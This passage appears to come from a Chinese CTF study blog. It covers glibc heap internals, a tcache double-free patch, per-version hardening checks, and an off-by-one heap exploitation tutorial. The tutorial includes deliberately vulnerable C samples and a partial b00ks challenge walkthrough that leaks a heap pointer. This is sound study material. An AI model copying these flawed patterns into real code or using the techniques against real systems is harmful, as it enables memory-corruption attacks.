tcache-&gt;entries[tc_idx];</span><br><span class="line">   tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">   ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">@@ <span class="number">-3005</span>,<span class="number">6</span> +<span class="number">3012</span>,<span class="number">7</span> @@ tcache_get (<span class="type">size_t</span> tc_idx)</span><br><span class="line">   assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">   tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">   --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">+  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">@@ <span class="number">-4218</span>,<span class="number">6</span> +<span class="number">4226</span>,<span class="number">26</span> @@ _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">+    <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">+    tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">+       trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">+       2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely coincidence</span></span><br><span class="line"><span class="comment">+       before aborting.  */</span></span><br><span class="line">+    <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))</span><br><span class="line">+      &#123;</span><br><span class="line">+       tcache_entry *tmp;</span><br><span class="line">+       LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">+       <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">+            tmp;</span><br><span class="line">+            tmp = tmp-&gt;next)</span><br><span class="line">+         <span class="keyword">if</span> (tmp == e)</span><br><span class="line">+           malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">+       <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a few</span></span><br><span class="line"><span class="comment">+          cycles, but don&#x27;t abort.  */</span></span><br><span class="line">+      &#125;</span><br><span class="line">+</span><br><span class="line">     <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br></pre></td></tr></table></figure><p>目前为止，只看到了在 free 操作的时候的 check ，似乎没有对 get 进行新的 check。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://ctf-wiki.org/en/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/#tcache-poisoning">Tcache attack - CTF Wiki (ctf-wiki.org)</a></p></li><li><p><a href="https://blog.csdn.net/qq_40890756/article/details/102560506">glibc Tcache机制-CSDN博客</a></p></li><li><p>CTF竞赛权威指南-pwn篇</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heap Exploitation-内存管理概述</title>
      <link href="/article/673a.html"/>
      <url>/article/673a.html</url>
      
        <content type="html"><![CDATA[<h1 id="Heap-Exploitation-内存管理概述"><a href="#Heap-Exploitation-内存管理概述" class="headerlink" title="Heap Exploitation - 内存管理概述"></a>Heap Exploitation - 内存管理概述</h1><p><del>本来想全看完源码写的，发现源码有亿点点多。看了后面忘前面，从效率上来说几乎没有效率，只能先了解大概，然后再慢慢看源码。</del></p><p>堆初始化主要是调用了一个核心函数_int_malloc，所以主要是int_malloc函数的相关操作。以下基于glibc2.23，pwn堆基础题也是基于该版本，后续版本的glibc增加了一些结构和检测机制，在堆管理上也有变化。</p><h2 id="内存各结构"><a href="#内存各结构" class="headerlink" title="内存各结构"></a>内存各结构</h2><p>之前在基础知识已经学习过各个结构，这里再次说明各结构在内存管理中的作用，以便于理解分配与释放过程。</p><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>分为main_arena（主分配区）和non_main_arena（非主分配区），主分配区通过系统调用brk()和内存映射系统调用mmap()来分配，非主分配区只能够通过mmap来分配。</p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>chunk的第二个域的最低一位为P，表示前一个块是否正在使用，为0即表示前一个chunk空闲，这时prev_size才有效，prev_size表示前一个chunk的size，通过这个值可以找到前一个chunk的开始地址。chunk空闲时，M状态不存在，只有AP状态，原本的用户数据区存放了四个指针，fd指向前一个空闲chunk，bk指向后一个空闲chunk。通过这两个指针将相近大小的chunk连成双向链表。large中存在fd_nextsize和bk_nextsize，来加快在large bin中匹配最近的空闲chunk。</p><h3 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h3><p>释放的内存不是直接归还给操作系统，ptmalloc会统一管理heap和mmap映射区域中的空闲chunk，避免重复的系统调用。相似大小的bin会被用双向链表连接起来，并被称为bin。ptmalloc共维护了128个bin，使用数组来存储。</p><p>small bins中的chunk按最近使用顺序进行排列，最后释放的chunk被链接到链表的头部，申请chunk从尾部开始，这样每一个chunk都有相同的机会被选中。</p><p>large bins中的chunk按大小排列，相同大小的chunk按最近使用顺序排列。</p><p>ptmalloc按”small-first，best-fit“（最小块优先，最佳匹配）的原则来查找空闲chunk。</p><p>空闲chunk被链接到bin时，ptmalloc会将该chunk的P位设置为0（这个标志实际上在下一个chunk中）。</p><h3 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h3><p>较小的chunk（小于等于max_fast，64B）的内存空间会被放到fast bin中，并且不会将P位修改，这样就不会将其合并。当用户申请内存时会先检查是否小于等于max_fast，在fast bins中找空闲块。在某个特定的时候ptmalloc会将fast bins中的相邻空闲chunk进行合并，将合并后的chunk加入到unsorted bins中，再加入bins中。</p><h3 id="unsorted-bins"><a href="#unsorted-bins" class="headerlink" title="unsorted bins"></a>unsorted bins</h3><p>释放的大小大于max_fast时，或者fast bins中的合并完成后，会被放到unsorted bins中。在进行malloc操作时，如果没有在fast bins找到合适的chunk，就会在unsorted bins中寻找合适的空闲chunk，找不到才会在bins中寻找。如果unsorted bins没有满足大小的chunk，那么就会将unsorted bins中的chunk加入bins中。可以将其理解为一个缓冲区，只是为了加快分配的速度。</p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>非主分配区会与预先从mmap分配一块较大的空闲内存模拟sub_heap，通过管理sub_heap来响应需求。内存按地址从低到高分配，在空闲最高处一定会有空闲chunk被称为top chunk。当bins和fast bin都不能满足分配时，ptmalloc就会从top chunk分一块内存给用户。如果不够，就会重新分配一个sub_heap，并将top chunk迁移新的sub_heap，新的sub_heap和已有的sub-heap通过单向链表连接，然后在新的top chunk上分配所需内存。</p><blockquote><p>在glibc内存管理中，“sub-heap” 是指被分配的堆空间被划分为多个更小的块的过程。glibc使用一个名为 “sub-heap” 的机制来管理堆内存，这样可以提高内存分配和释放的效率。</p></blockquote><p>top chunk在fast bins和bins以后才会考虑，top chunk无论多大都不会放到fast bins和bins中。top chunk在分配中大小会不断改变，当回收的chunk的与top chunk相邻时，就会与top chunk合并为新的top chunk。如果free时回收的内存大于某个阈值，并且top chunk的大小也超过收缩阈值，ptmalloc会收缩sub-heap，但是至少要保留一个页大小的空闲内存。如果top chunk包含了整个sub_heap，ptmalloc会调用munmap把整个sub_heap的内存返回操作系统。如果向主分配区的top chunk申请内存，如果top chunk中没有空闲内存，ptmalloc就会屌用sbrk()将进程heap的边界brk上移，然后修改top chunk的大小。</p><h3 id="mmaped-chunk"><a href="#mmaped-chunk" class="headerlink" title="mmaped chunk"></a>mmaped chunk</h3><p>所需chunk很大以至于fast bins、bins、top chunk都不能满足要求时，ptmalloc就会使用mmap，来直接使用内存映射将页映射到内存空间，这样分配的内存会在释放时直接还给操作系统，再次引用会造成segmentation fault错误。</p><h3 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h3><p>当需要一个small chunk但是找不到合适的空闲chunk时，如果last remainder大于所需的small chunk，就会将其分割，一个给用户，一个继续作为last remainder。</p><h2 id="内存分配概述"><a href="#内存分配概述" class="headerlink" title="内存分配概述"></a>内存分配概述</h2><ol><li>线程先查看线程私有实例中是否已经存在一个分配区，有就会尝试加锁。加锁成功就使用该分配区分配内存，否则就获取一个空闲的分配区，如果所有的分配区都加锁了就会开辟一个新的分配区，并将其加入全局分配循环链表和线程私有实例中，加锁，使用该分配区进行内存分配。开辟出来的新分配区一定为非主分配区，因为主分配区是父进程那里继承来的。开辟非主分配区时会调用 mmap 创建一个 sub_heap ，并设置好 top chunk 。</li></ol><blockquote><p>malloc会遍历所有的可用分配区，遍历的过程中会尝试锁该分配区。当一个分配区对应的线程未使用堆内存则表示可锁。那么如果该分配区可锁，就可以直接被使用。</p></blockquote><ol start="2"><li><p>将用户申请的大小转换为实际需要分配的大小。</p></li><li><p>判断要分配的chunk大小是否小于max_fast，满足就进入下一步，否则转第五步</p></li><li><p>试着将fast bins里的第一个chunk取出。如果不为空，那么就会检查该chunk是否出错，没有问题就返回该chunk用户地址并退出，分配结束。</p></li><li><p>如果没有在fast bins中找到空闲的或是合适的chunk就会走到这一步，先判断申请的chunk大小是不是小于small bins的最大值（chunk_size &lt; 512B），是就进入下一步，否则进入第七步</p></li><li><p>根据需要的chunk大小，从small bins的尾部摘取一个恰好满足大小的chunk，成功就分配结束，否则进入下一步</p></li><li><p>到这一步说明需要分配的是一块大内存或者是small bins找不到合适的chunk。ptmalloc会遍历fast bins中的chunk，将相邻的chunk合并，并连接到unsorted bins中。之后会遍历unsorted bins，如果unsorted bins中只有一个chunk，并且在上次分配被使用过，而所需的chunk大小属于small bins，大小也相等，这时就会直接将chunk切割，分配结束，否则就根据大小将其放到small bins或是large bins中。遍历完成，进入下一步</p></li><li><p>到这一步说明需要的是一块大内存，或者small bins和unsorted bins中都没有合适的chunk，在上一步中清理干净了fast bins和unsorted bins。那么就从large bins中按照”small-first，best-fit“寻找合适的chunk，从中划分一个所需大小的chunk，将剩下的部分链接回bins中，操作成功分配结束，否则就进入下一步</p></li><li><p>如果fast bins和bins都没找到合适的chunk，那么就需要分割top chunk了。如果top chunk满足所需chunk的大小就分割一块，否则进入下一步</p></li><li><p>到了这一步，说明top chunk也不能满足需求。这是如果是主分配区，就调用sbrk来增加top chunk大小；如果是非分配区，就调用mmap来分配一个新的sub-heap，增加top chunk的大小，或者直接使用mmap分配，这里需要根据chunk的大小来决定怎么进行分配。如果chunk的大小大于等于mmap的阈值就进入下一步，否则就进入第12步</p></li><li><p>使用mmap系统调用为程序的内存空间映射一块chunk_size align 4KB大小的空间，将内存指针返回给用户</p><blockquote><p>align 4KB：起始地址4KB对齐</p></blockquote></li><li><p>判断是否为第一次调用malloc，主分配区就需要进行初始化操作，分配一块大小为（chunk_size + 128KB）align 4KB大小的空间作为初始的heap；如果已经初始化了，主分配区调用sbrk增加heap空间，非主分配区就在top chunk分割出一个chunk满足分配需求，将内存指针返回</p></li></ol><h2 id="内存回收概述"><a href="#内存回收概述" class="headerlink" title="内存回收概述"></a>内存回收概述</h2><ol><li>free也会用到锁，保证线程安全</li><li>判断传入指针</li></ol><h2 id="glibc各版本新增机制和修改"><a href="#glibc各版本新增机制和修改" class="headerlink" title="glibc各版本新增机制和修改"></a>glibc各版本新增机制和修改</h2><h3 id="glibc2-23"><a href="#glibc2-23" class="headerlink" title="glibc2.23"></a>glibc2.23</h3><p>pwn题经典版本，入门题和基础题大多都是glibc2.23版本，堆管理漏洞多并且利用办法多。通常都是基于Dangling pointer和overflow漏洞，和一些不严谨的检测机制，实现任意地址读写。</p><h3 id="glibc2-27"><a href="#glibc2-27" class="headerlink" title="glibc2.27"></a>glibc2.27</h3><p>添加了tcache结构，tcache bin在glibc2.26引入，用来提升堆管理性能。关于tcache会专门学习，这里只写大概。</p><ul><li><p>添加了TCACHE_MAX_BIN宏定义，定义了管理tcache的最大bin数量，有64个bin被用于管理tcahce bin。对应的chunk size从MALLOC_ALIGNMENT * 2到MALLOC_ALLIGNMENT * 64，64位系统中tcache bin中最大能存储0x800的大小，HACHE_FILL_COUNT定义了bin最多能存储的个数。</p></li><li><p>添加了两个tcache结构，tcache_entry是一个单向链表，将bin中的chunk连成一个单向链表，机制类似于fast bin。tcache_perthread_struct是用来管理bin的一个结构，其有一个char数组成员，用来记录给个bin已经储存了几个chunk，entries是每个不同大小bins的队头，用来遍历和管理tcache bin。</p></li><li><p>加入tcache和取出tcache的两个函数。</p></li></ul><p>malloc和free的逻辑也有一些改变</p><ul><li>_libc_malloc中，在调用int_malloc函数之前会先去搜索tcache是否有空闲的chunk，有就直接从tcache分配，没有才执行int_malloc</li><li>_int_malloc中，fast bins和small bins和unsorted bins中多余的块会被放入tcache中</li><li>free会先检查是否处于tcache范围，tcahce未满就会直接put进去</li></ul><h3 id="glibc2-29"><a href="#glibc2-29" class="headerlink" title="glibc2.29"></a>glibc2.29</h3><p>修改了一些malloc和free chunk的检测机制。</p><p><strong>在tcache新增了检测字段key，主要是用来检测double free</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>在加入tchche bins时会将key字段赋值为tchche的地址，取出时会将其清零。</p><p><strong>int_free新增检测机制</strong></p><p>新增了在tcache释放时对key字段的检验，如果当前释放的chunk的key字段位为tcache时，判断其为double free</p><p><strong>unlink新增检测机制</strong></p><p>unlink解链前，会检查chunk大小是否与presize相同，增加了null of byte的难度</p><p><strong>int-malloc新增检测机制</strong></p><p>新增关于unsorted bins的检测，检测chunksize的合法性，next chunk size的合法性，以及双向链表的完整，unsorted bin attack攻击很难继续使用</p><p><strong>use_top新增检测机制</strong></p><p>在_int_malloc中对use_top新增了检测机制，使用top chunk时对top chunk的大小进行了检测，使得horse of force无法再使用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<span class="comment">//0x21000</span></span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="glibc2-30"><a href="#glibc2-30" class="headerlink" title="glibc2.30"></a>glibc2.30</h3><p>在_int_malloc中，将unsorted bins中的内容放入large bins时会检测fwd链表的完整性，使得large bin attack无法再使用</p><h3 id="glibc2-31"><a href="#glibc2-31" class="headerlink" title="glibc2.31"></a>glibc2.31</h3><p>暂无</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.yuque.com/hxfqg9/bin/nvrgrs">堆相关知识 (yuque.com)</a></li><li><a href="https://kiprey.github.io/2020/04/heap-4-_int_malloc_process/">heap - 4 - _int_malloc的相关操作 | Kiprey’s Blog</a></li><li><a href="https://blog.csdn.net/sinat_19596835/article/details/81665095">malloc内存管理总结_g_malloc实现-CSDN博客</a></li><li><a href="http://jcs.iie.ac.cn/xxaqxb/ch/reader/create_pdf.aspx?file_no=20180101">http://jcs.iie.ac.cn/xxaqxb/ch/reader/create_pdf.aspx?file_no=20180101</a></li><li><a href="https://www.anquanke.com/post/id/194960#h2-2">glibc-2.29新增的保护机制学习总结-安全客 - 安全资讯平台 (anquanke.com)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heap Exploitation-Off by one</title>
      <link href="/article/2066.html"/>
      <url>/article/2066.html</url>
      
        <content type="html"><![CDATA[<h1 id="Heap-Exploitation-Off-By-One"><a href="#Heap-Exploitation-Off-By-One" class="headerlink" title="Heap Exploitation - Off By One"></a>Heap Exploitation - Off By One</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>off-by-one指单字节缓冲区溢出，是一种特殊的栈溢出漏洞，指向缓冲区写入时，写入的字节数超过缓冲区本身申请的字节数并只越界一个字节。这种漏洞的产生往往与边界验证不严和字符串操作有关。off-by-one可以基于各种缓冲区，栈、堆。bss段等等都可以，CTF中常见的是堆中的off-by-one。</p><p>循环边界不严谨</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">my_gets</span><span class="params">(<span class="type">char</span> *ptr,<span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i] = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input:&quot;</span>);</span><br><span class="line">    my_gets(chunk1, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建了两个16字节的堆，但是在my_gets函数执行时，循环多了一次，会溢出一个字节。</p><p>字符串长度判断有误</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将字符串放到chunk1中，忽略结束符\x00，strcpy会将结束符也存在堆块中，溢出一个字节。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul><li><p>溢出字节为可控制任意字节，通过修改大小造成结构之间的重叠，从而泄露其他块的数据或者是覆盖其他块数据，从而达到读写的目的，也可以使用NULL字节溢出的方法</p></li><li><p>溢出字节为NULL字节，在size为0x100的时候溢出NULL字节就可以使得pre_in_use（就是chunk中的P位）被覆盖，这样前一个块会被认为是空闲块</p><ul><li>可以使用unlink来进行处理（unlink挖个坑，以后补）</li><li>由于前一个块被改为free，那么prev_size就可以被伪造，使得块之间发生重叠。</li></ul><p>方法的实现前提是unlink时没有按照prev_size找到的块的大小与prev_size一致来检查。</p></li></ul><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><p>在libc-2.29之后，针对利用prev_size的方法加入了检测机制。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* 后两行代码在最新版本中加入，2.28 及之前都没有问题 */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以绕过，不太好懂，可以通过例题Balsn_CTF_2019-PlainText，先挖个坑</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h3><p>题目来源：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks</a></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>首先分析代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">v3</span>;</span> <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = <span class="built_in">stdin</span>;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  welcome(v3);</span><br><span class="line">  updateAuthor(v3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = Menu();</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        createBook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        deleteBook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        updateBook(v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        printfBook(v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        updateAuthor(v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        v3 = (<span class="keyword">struct</span> _IO_FILE *)<span class="string">&quot;Wrong option&quot;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong option&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thanks to use our library software&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在updateAuthor函数里，调用了sub_9F5函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_9F5</span><span class="params">(_BYTE *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, a1, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数没有对循环边界做限制，所以会判断变量i等于32，实际上执行了33次。off_202018存放的是作者名。</p><p>后面的createBook函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*((_DWORD *)v3 + <span class="number">6</span>) = v1;</span><br><span class="line">*((_QWORD *)off_202010 + v2) = v3;</span><br><span class="line">*((_QWORD *)v3 + <span class="number">2</span>) = v5;</span><br><span class="line">*((_QWORD *)v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">*(_DWORD *)v3 = ++unk_202024;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><p>创建了一个图书的结构体，将图书的指针放到off_202010里面。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">char</span> *description;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而之前溢出的那个函数将作者名存放到了off_202018，这俩挨着</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331357.png" alt="image-20231111122347219"></p><p>那么循环多出来的一次会将\x00写到off_202010也就是结构体的第一个字节，会将创建的第一本图书的低字节覆盖</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331361.png" alt="image-20231111122349561"></p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><h4 id="定位作者名"><a href="#定位作者名" class="headerlink" title="定位作者名"></a>定位作者名</h4><p>代码跑起来，输入长度为32的字符串，然后ctrl+c进调试</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331370.png" alt="image-20231111123152309"></p><p>定位刚才输入的字符串，直接search</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331367.png" alt="image-20231111123240047"></p><p>或者，vmmap看代码段起始位置</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331385.png" alt="image-20231111123348294"></p><p>加上偏移0x202018，0x555555554000 + 0x202018 &#x3D; 0x555555602018</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331390.png" alt="image-20231111123647736"></p><p>找到地址就能直接看到字符串了</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331890.png" alt="image-20231111123925126"></p><p>圈住的这个就是溢出的</p><h4 id="定位图书结构体"><a href="#定位图书结构体" class="headerlink" title="定位图书结构体"></a>定位图书结构体</h4><p>创建两本书，图书1的书名大小为128，内容大小尽量大一点（如140），图书2的书名和内容大小为135168</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331921.png" alt="image-20231111124114110"></p><p>还是基址加偏移，0x555555400000 + 0x202010 &#x3D; 0x555555602010</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331949.png" alt="image-20231111124345081"></p><p>能看到两个指针，book1的结构体指针为0x555555603770，book2的结构体指针为0x5555556037a0，那么book2相对于book1的偏移为0x30，也能看到刚才输入的作者名。</p><p>而由于作者名和图书结构体相连，所以实际上结构体指针的低位将原来的\x00覆盖了，这时候如果输出作者名，那么图书结构体的低位也会被输出。这个低位是图书结构体指针的位置，那么图书结构体指针也会被输出。打印图书信息就会泄露book1的地址。</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331976.png" alt="image-20231111125344173"></p><p>上面找到了偏移，通过偏移就能够找到book2。</p><h4 id="覆盖结构体指针"><a href="#覆盖结构体指针" class="headerlink" title="覆盖结构体指针"></a>覆盖结构体指针</h4><p>接下来尝试覆盖结构体指针，查看book1内容</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331010.png" alt="image-20231111131305032"></p><p>0x555555603770存放的book id，0x555555603778存放的是book name，0x555555603780存放的是book 